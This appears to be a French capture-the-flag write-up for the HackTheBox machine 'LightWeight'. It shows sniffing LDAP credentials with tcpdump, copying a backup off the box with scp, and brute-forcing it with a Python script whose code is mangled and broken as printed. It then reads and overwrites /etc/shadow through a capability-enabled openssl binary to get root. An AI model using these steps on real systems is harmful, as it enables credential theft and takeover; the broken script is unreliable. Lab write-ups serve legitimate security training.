<hr />

<h2 id="titlehacktheboxlightweight">title: "HackTheBox - LightWeight"</h2>

<p><img src="http://image.noelshack.com/fichiers/2018/52/7/1546159641-capture-du-2018-12-30-09-47-09.png" alt="Flower" /></p>

<h2 id="informations">Informations</h2>

<pre><code>Ip :  10.10.10.119      Created by : 0xEA31
Level : Not too easy    Base Points : 30
</code></pre>

<h2 id="nmapscan">Nmap Scan</h2>

<pre><code>Starting Nmap 7.01 ( https://nmap.org ) at 2018-12-30 09:50 CET
Nmap scan report for 10.10.10.119
Host is up (0.054s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 19:97:59:9a:15:fd:d2:ac:bd:84:73:c4:29:e9:2b:73 (RSA)
|_  256 88:58:a1:cf:38:cd:2e:15:1d:2c:7f:72:06:a3:57:67 (ECDSA)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Lightweight slider evaluation page - slendr
389/tcp open  ldap    OpenLDAP 2.2.X - 2.3.X
| ssl-cert: Subject: commonName=lightweight.htb
| Not valid before: 2018-06-09T13:32:51
|_Not valid after:  2019-06-09T13:32:51
|_ssl-date: TLS randomness does not represent time

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 39.45 seconds
</code></pre>

<p>Parfait nous avons 3 ports, le SSH, le HTTP, et enfin pour le protocole LDAP.
Nous allons énumerer les services ouverts.</p>

<h2 id="http">HTTP</h2>

<p>Comme on peut le voir, nous devons nous connecter avec notre adresse IP comme username et mot de passe pour pouvoir accéder au serveur SSH. (Petite précision si vous tentez de FUZZ le serveur HTTP vous serez bannie 5 minutes.)</p>

<p><a href="https://hackthebox.eu/"><img src="http://image.noelshack.com/fichiers/2018/52/7/1546159986-capture-du-2018-12-30-09-52-53.png" alt="forthebadge made-with-python" /></a></p>

<h2 id="ssh">SSH</h2>

<p>Parfait nous sommes connecté au serveur SSH mais pas en tant que utilisateur. L'username et le mot de passe est l'adresse IP de l'interface <strong>tun0</strong> très important.</p>

<pre><code>root@Seyptoo:~/htb/writeup/LightWeight# ssh 10.10.10.119 -l 10.10.12.232
10.10.12.232@10.10.10.119's password: 
[10.10.12.232@lightweight ~]$ 
</code></pre>

<blockquote>
  <p>L'options <strong>-l</strong> pour <strong>login_name</strong>. Le nom d'utilisateur ou quoi.</p>
</blockquote>

<p>Nous allons simplement voir les utilisateurs dans le serveur avec la commande <strong>awk</strong>.</p>

<pre><code>awk -F: '{print $1,$7}' /etc/passwd|grep '/bin/bash'
root /bin/bash
ldapuser1 /bin/bash
ldapuser2 /bin/bash
10.10.12.232 /bin/bash
</code></pre>

<p>Parfait comme nous pouvons le voir il y'a 4 utilisateurs, <strong>root</strong>,<strong>ldapuser1</strong>,<strong>ldapuser2</strong> et enfin l'utilisateur <strong>10.10.12.232</strong></p>

<p><strong>-F:</strong> (Permet de couper c'est l'équivalent de la fonction split sur Python.) <br />
<strong>'{print $1,$7}'</strong> (Permet d'afficher la valeur numéro 1 et le numéro 7.) <br />
<strong>/etc/passwd</strong> (Le fichier.) <br />
<strong>grep '/bin/bash'</strong> (La commande grep permet de chercher une chaîne de caractère.)</p>

<h2 id="lescapabilitiessouslinux">Les capabilities sous Linux</h2>

<p>Après avoir chercher pendant des heures j'ai enfin trouver quelque chose de très intéréssant, c'est les <strong>capabilities</strong>. Les capabilities ça peut être très dangereux pour des raison assez spécifiques.</p>

<p>Les capabilities :
La gestion des capabilities est un mécanisme de sécurité du noyau Linux concourant à assurer un confinement d’exécution des applications s’exécutant sur le système en affinant les possibilités d'appliquer le principe du moindre privilège.</p>

<p>Pour chercher les fichiers :</p>

<pre><code>[10.10.12.232@lightweight ~]$ getcap -r / 2&gt;/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
[10.10.12.232@lightweight ~]$ 
</code></pre>

<p>Nous avons plusieurs programmes, on va se concentrer sur le programme tcpdump.</p>

<pre><code>[10.10.12.232@lightweight ~]$ ls -l /usr/sbin/tcpdump
-rwxr-xr-x. 1 root root 942304 11 avril  2018 /usr/sbin/tcpdump
[10.10.12.232@lightweight ~]$ 
</code></pre>

<h2 id="tcpdump">TCPDUMP</h2>

<p>Nous allons essayer de capturer les données du protocole LDAP avec la commande tcpdump et d'exécuter toutes les pages sur le serveur HTTP.</p>

<pre><code>[10.10.12.232@lightweight ~]$ tcpdump -i lo -nnXSs 0 'port 389'
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on lo, link-type EN10MB (Ethernet), capture size 262144 bytes
</code></pre>

<p>Après avoir taper la commande vous devez obligatoirement allez sur le serveur HTTP est d'exécuter toutes les pages le plus important <strong>status.php</strong>.</p>

<pre><code>0x0000:  4500 008f 3c3f 4000 4006 d528 0a0a 0a77  E...&lt;?@.@..(...w
0x0010:  0a0a 0a77 ad98 0185 83a1 cdb7 c84a 7ff5  ...w.........J..
0x0020:  8018 02ab 2983 0000 0101 080a 003f f18c  ....)........?..
0x0030:  003f f18b 3059 0201 0160 5402 0103 042d  .?..0Y...`T....-
0x0040:  7569 643d 6c64 6170 7573 6572 322c 6f75  uid=ldapuser2,ou
0x0050:  3d50 656f 706c 652c 6463 3d6c 6967 6874  =People,dc=light
0x0060:  7765 6967 6874 2c64 633d 6874 6280 2038  weight,dc=htb..8
0x0070:  6263 3832 3531 3333 3261 6265 3164 3766  bc8251332abe1d7f
0x0080:  3130 3564 3365 3533 6164 3339 6163 32    105d3e53ad39ac2
</code></pre>

<p>Parfait nous avons trouver le mot de passe grâce à TCPDUMP nous avons pour de bon trouver le mot de passe nous devons nous connecter avec la commande <strong>su</strong>.</p>

<pre><code>[10.10.12.232@lightweight ~]$ su - ldapuser2
Mot de passe : 
Dernière connexion : dimanche 30 décembre 2018 à 08:38:47 GMT sur pts/1
[ldapuser2@lightweight ~]$ 
</code></pre>

<blockquote>
  <p>Username : ldapuser2 <br />
  Password : 8bc8251332abe1d7f105d3e53ad39ac2</p>
</blockquote>

<p>Parfait nous sommes connecté.</p>

<pre><code>[ldapuser2@lightweight ~]$ ls
backup.7z  OpenLDAP-Admin-Guide.pdf  OpenLdap.pdf  user.txt
[ldapuser2@lightweight ~]$ wc -c user.txt 
33 user.txt
[ldapuser2@lightweight ~]$
</code></pre>

<p>Comme vous pouvez le voir il y'a un fichier backup nous allons essayer de le transférer vers notre machine physique avec la commande <strong>scp</strong>.</p>

<pre><code>[ldapuser2@lightweight ~]$ scp -r -p $HOME/backup.7z seyptoo@10.10.12.232:/home/seyptoo/Bureau
The authenticity of host '10.10.12.232 (10.10.12.232)' can't be established.
ECDSA key fingerprint is SHA256:4ycMzm1pTioJxy5Bc7ALoE3W6QCRow3C0LSnbSmsMzo.
ECDSA key fingerprint is MD5:3e:3c:10:13:79:db:36:76:a5:85:b5:8e:3b:ce:08:98.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '10.10.12.232' (ECDSA) to the list of known hosts.
seyptoo@10.10.12.232's password: 
backup.7z                                                                                                                       100% 3411    56.4KB/s   00:00    
[ldapuser2@lightweight ~]$
</code></pre>

<p>Parfait le fichier a été transférer avec succès ! C'est un fichier 7z nous devons extraire le fichier avec la commande <strong>7z</strong>.</p>

<pre><code>root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# 7z x backup.7z 

7-Zip [64] 9.20  Copyright (c) 1999-2010 Igor Pavlov  2010-11-18
p7zip Version 9.20 (locale=fr_FR.UTF-8,Utf16=on,HugeFiles=on,4 CPUs)

Processing archive: backup.7z


Enter password (will not be echoed) :
</code></pre>

<p>Merde le fichier est protégé par un mot de passe, j'ai créer un programme en Python exprès pour ça ! :D</p>

<p>{% highlight python %}</p>

<h1 id="codingutf8">coding:utf-8</h1>

<p>import sys
import os as subprocessing
import Queue
import threading
import optparse</p>

<p>class SevenZipIncorrect(Exception):
    def <strong>init</strong>(self, error<em>zip):
        self.error</em>zip = error_zip</p>

<p>class SevenZip(threading.Thread):
    def <strong>init</strong>(self, threads=35, command=None):
        threading.Thread.<strong>init</strong>(self)
        self.threads<em>tds = threads
        self.command</em>tds = command</p>

<pre><code>        self.argument_on = sys.argv[1]
        self.argument_wd = sys.argv[2]

  def ExtensionModel(self, q):
        if(self.argument_on.endswith(".7z") == True):
              while True:
                BertModel = q
                BertModel = BertModel.get()
                self.command_tds = ("7z x -p%s %s -aoa &gt;/dev/null" %(BertModel, self.argument_on))
                output_status_ts = subprocessing.system(self.command_tds)

                if(output_status_ts == 0):
                      print "\n[+] Password cracked with success : %s\n" %(BertModel)
                      sys.exit(1)
                else: # If password is not cracked.
                      print "[-] Password not cracked : %s" %(BertModel)

        else:
              raise SevenZipIncorrect("File is extensions incorrect")

def run(self):
    q = Queue.Queue()
    with open(self.argument_wd, "r") as BertModel:
        for Queue_Reverse in BertModel:
            q.put(Queue_Reverse.rstrip("\n\r"))
        self.ExtensionModel(q)

    for i in range(int(self.threads_tds)):
        wrapper = threading.Thread(target=self.ExtensionModel, args=(i, q))
        wrapper.setDaemon(True)
        wrapper.start()
        wrapper.join(600)

    q.join()
</code></pre>

<p>if <strong>name</strong> == "<strong>main</strong>":
  Algorithm = SevenZip()
  Algorithm.start()
{% endhighlight %}</p>

<p>Si vous avez des problèmes d'indentations vous avez juste à allez dans ma page Github et il y'a une repositories qui se nomme 7z-BruteForce vous avez juste à git clone ça ! ;)</p>

<pre><code>root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# python params.py backup.7z /usr/share/wordlist/directory-list-2.3-medium.txt
</code></pre>

<p>Pour la liste je vous conseille d'utiliser rockyou.txt. Personnellement le bruteforce à pris seulement environ 10 minutes.</p>

<pre><code>[-] Password not cracked : help
[-] Password not cracked : events
[-] Password not cracked : archive
[-] Password not cracked : 02
[-] Password not cracked : register
[-] Password not cracked : en
[-] Password not cracked : forum
[-] Password not cracked : software
[-] Password not cracked : downloads
[-] Password not cracked : 3

[+] Password cracked with success : delete
</code></pre>

<p>Parfait nous avons cracker le mot de passe. Le mot de passe est <strong>delete</strong> donc vous pouvez extraires les fichiers backup. Si nous regardons le fichier <strong>status.php</strong>.</p>

<pre><code>root@seyptoo-Aspire-E5-721:/home/seyptoo/Bureau# cat status.php|grep -e 'username' -e 'password'
$username = 'ldapuser1';
$password = 'f3ca9d298a553da117442deeb6fa932d';
if ($bind=ldap_bind($ds, $dn, $password)) {
</code></pre>

<p>Parfait nous avons trouver le mot de passe pour accéder à l'utilisateur <strong>ldapuser1</strong>. On se connecte avec la commande <strong>su</strong>.</p>

<pre><code>[10.10.12.232@lightweight ~]$ su - ldapuser1
Mot de passe : 
Dernière connexion : dimanche 30 décembre 2018 à 09:11:32 GMT sur pts/1
[ldapuser1@lightweight ~]$ 
</code></pre>

<h2 id="privesc">PrivEsc</h2>

<p>Maintenant nous passons au root. Le root n'est pas très compliqué.</p>

<p>Nous allons reutiliser la commande <strong>getcap</strong>.</p>

<pre><code>[ldapuser1@lightweight ~]$ getcap -r / 2&gt;/dev/null
/usr/bin/ping = cap_net_admin,cap_net_raw+p
/usr/sbin/mtr = cap_net_raw+ep
/usr/sbin/suexec = cap_setgid,cap_setuid+ep
/usr/sbin/arping = cap_net_raw+p
/usr/sbin/clockdiff = cap_net_raw+p
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
/home/ldapuser1/openssl =ep
</code></pre>

<p>Comme vous pouvez le voir il y'a un fichier qui se nomme openssl nous avons juste à lire le fichier root.txt avec la commande openssl.</p>

<pre><code>[ldapuser1@lightweight ~]$ /home/ldapuser1/openssl enc -in /root/root.txt -out /tmp/password.txt
[ldapuser1@lightweight ~]$ wc -c /tmp/password.txt 
33 /tmp/password.txt
[ldapuser1@lightweight ~]$
</code></pre>

<p>Nous avons bien le root.txt mais il faut être root c'est le principe d'une box. Donc notre but c'est de lire le fichier /etc/shadow et ensuite de le mettre dans le dossier /tmp, de changer le hash par notre hash avec mkpasswd pour ensuite remplacer /etc/shadow par notre fichier.</p>

<p>Tout d'abord on va crée notre mot de passe :</p>

<pre><code>root@Seyptoo:~/htb# mkpasswd -m sha-512 seyptoo
$6$wtB8S4kweNAe37hN$Rttczh0dwMiKu7cAVcSQkTx8yxtG1qEwvBNrFommSsEmrQJ5LJjeOAKFQZw5QGH59VRqkE1bBFXsyrF6sQMS/0
</code></pre>

<p>Ensuite dans la machine LightWeight, nous allons créer clé privée avec openssl, et également de créer un fichier pem.</p>

<pre><code>[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl genrsa -out /tmp/key.pem 2048 # private key.
[...SNIP...]
[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes # pem.
[...SNIP...]
</code></pre>

<p>Une fois que c'est ok, nous allons tout simplement lire le fichier /etc/shadow et de le mettre dans le dossier /tmp et ensuite de modifier le mot de passe root.</p>

<pre><code>[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl enc -in /etc/shadow -out /tmp/shadow
[ldapuser1@lightweight tmp]$ vim /tmp/shadow
root:$6$xQPkHtTmdxu$Tzpw.1d.5bb0TeHyMmZcb4Myg5FIRi4G4SfPDAXE2./vPYspVnMz1xigdAdXy/3GMIygruFPhwRBDX8YV5QzI1:17711:0:99999:7:::
[...SNIP...]
</code></pre>

<p>Une fois que la valeur a été modifié nous allons transmettre ce fichier dans le dossier /etc.</p>

<pre><code>[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl smime -encrypt -aes256 -in /tmp/shadow -binary -outform DER -out /tmp/shadow.enc /tmp/cert.pem
[ldapuser1@lightweight tmp]$ /home/ldapuser1/openssl smime -decrypt -in /tmp/shadow.enc -inform DER -inkey /tmp/key.pem -out /etc/shadow
[ldapuser1@lightweight tmp]$ su - root
Password: seyptoo
Last login: Thu May  9 09:01:37 BST 2019 on pts/5
Last failed login: Thu May  9 09:16:01 BST 2019 from 10.10.12.236 on ssh:notty
There was 1 failed login attempt since the last successful login.
[root@lightweight ~]# id
uid=0(root) gid=0(root) groups=0(root)
</code></pre>

<p><img src="https://media.giphy.com/media/1tHzw9PZCB3gY/giphy.gif" alt="frustrated-computer-baboon" /></p>

<p>Parfait nous sommes root. C'étais ma box préférer n'hésiter pas à mettre un star dans ma repo ça me feras grave plaisir ! :D</p>
